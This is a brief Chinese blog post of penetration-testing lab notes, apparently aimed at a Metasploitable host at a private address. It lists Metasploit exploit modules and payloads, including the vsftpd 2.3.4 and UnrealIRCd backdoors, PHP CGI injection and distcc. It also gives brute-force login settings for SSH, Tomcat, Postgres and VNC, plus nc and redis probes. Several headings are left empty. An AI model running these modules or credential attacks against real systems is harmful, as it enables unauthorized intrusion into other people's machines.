---
layout: post
title:  "msfconsole"
date:   2018-10-15 00:00:01 +0800
categories: linux
tags: msfconsole
description: ssh遇到问题集合
---
3.1	Vsftp 2.3.4 版本

Module：exploit/unix/ftp/vsftpd_234_backdoor

Payload：cmd/unix/interact

3.2	Web服务（80端口）

输入参数：

3.3	Php CGI注入

Module：exploit/multi/http/php_cgi_arg_injection

Payload：php/meterpreter/bind_tcp

3.4	SMB目录共享

139端口，445端口这两个都是smb类型的，是共享服务，首选我们需要知道它的共享目录有哪些

Module：auxiliary/scanner/smb/smb_enumusers

Module：auxiliary/admin/smb/samba_symlink_traversal

port 22 search ssh

use auxiliary/scanner/ssh/ssh_login

show options

set rhosts 192.168.190.130

set user_file /tmp/user.txt

set pass_file /tmp/passwd.txt

run


3.5	Msfable后门

telnet 192.168.190.130

3.6	JAVA反序列化



3.7	Distccd服务远程命令(不建议)

Module：exploit/unix/misc/distcc_exec

Payload：cmd/unix/bind_perl

3.8	Postgresql弱密码

use auxiliary/scanner/postgres/postgres_login

3.9	VNC服务

port 5900 vnc

use auxiliary/scanner/vnc/vnc_login

3.10	IRC服务

port 6667 IRC

use exploit/unix/irc/unreal_ircd_3281_backdoor

3.11	Tomcat服务

use auxiliary/scanner/http/tomcat_mgr_login

set user_file /tmp/user.txt

set pass_file /tmp/passwd.txt

set rport 8180


3.12	Drb服务

Module：exploit/linux/misc/drb_remote_codeexec

Payload：cmd/unix/bind_perl

3.13

redis

./redis-cli -p 30000 -h 192.168.190.130

info

3.14

echo envi|nc 192.168.190.130 2181
